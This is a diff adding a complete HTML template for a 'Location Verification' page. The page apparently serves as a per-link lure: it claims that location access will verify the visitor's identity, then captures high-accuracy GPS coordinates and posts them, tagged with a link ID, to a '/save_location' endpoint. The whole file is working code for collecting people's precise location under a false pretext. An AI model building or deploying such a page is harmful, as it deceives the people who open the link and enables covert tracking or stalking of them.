@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Your Location</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: white; border-radius: 20px; padding: 40px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+        .icon { font-size: 60px; margin-bottom: 20px; }
+        h1 { color: #333; margin-bottom: 15px; font-size: 24px; }
+        p { color: #666; margin-bottom: 25px; line-height: 1.6; }
+        button { padding: 15px 40px; border: none; border-radius: 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
+        button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4); }
+        button:disabled { background: #ccc; cursor: not-allowed; transform: none; box-shadow: none; }
+        .status { margin-top: 20px; padding: 15px; border-radius: 10px; display: none; }
+        .status.success { background: #d4edda; color: #155724; display: block; }
+        .status.error { background: #f8d7da; color: #721c24; display: block; }
+        .status.loading { background: #fff3cd; color: #856404; display: block; }
+        .privacy { margin-top: 25px; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">📍</div>
+        <h1>Location Verification</h1>
+        <p>Please allow location access to verify your identity. This is a one-time request.</p>
+
+        <button id="allowBtn" onclick="requestLocation()">Allow Location Access</button>
+
+        <div id="status" class="status"></div>
+
+        <p class="privacy">Your location will only be used for verification purposes.</p>
+    </div>
+
+    <script>
+        const linkId = "{{ link_id }}";
+
+        function requestLocation() {
+            const btn = document.getElementById('allowBtn');
+            const status = document.getElementById('status');
+
+            btn.disabled = true;
+            btn.textContent = 'Requesting...';
+            status.className = 'status loading';
+            status.textContent = 'Requesting location access...';
+
+            if (!navigator.geolocation) {
+                status.className = 'status error';
+                status.textContent = 'Geolocation is not supported by your browser.';
+                btn.disabled = false;
+                btn.textContent = 'Allow Location Access';
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    status.className = 'status loading';
+                    status.textContent = 'Sending location...';
+
+                    fetch('/save_location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            link_id: linkId,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            status.className = 'status success';
+                            status.textContent = 'Location verified successfully! Thank you.';
+                            btn.textContent = 'Verified ✓';
+                        } else {
+                            throw new Error(data.error);
+                        }
+                    })
+                    .catch(error => {
+                        status.className = 'status error';
+                        status.textContent = 'Failed to send location. Please try again.';
+                        btn.disabled = false;
+                        btn.textContent = 'Allow Location Access';
+                    });
+                },
+                function(error) {
+                    status.className = 'status error';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            status.textContent = 'Location access denied. Please enable location permissions.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            status.textContent = 'Location information unavailable.';
+                            break;
+                        case error.TIMEOUT:
+                            status.textContent = 'Location request timed out.';
+                            break;
+                        default:
+                            status.textContent = 'An unknown error occurred.';
+                    }
+                    btn.disabled = false;
+                    btn.textContent = 'Try Again';
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+    </script>
+</body>
+</html>
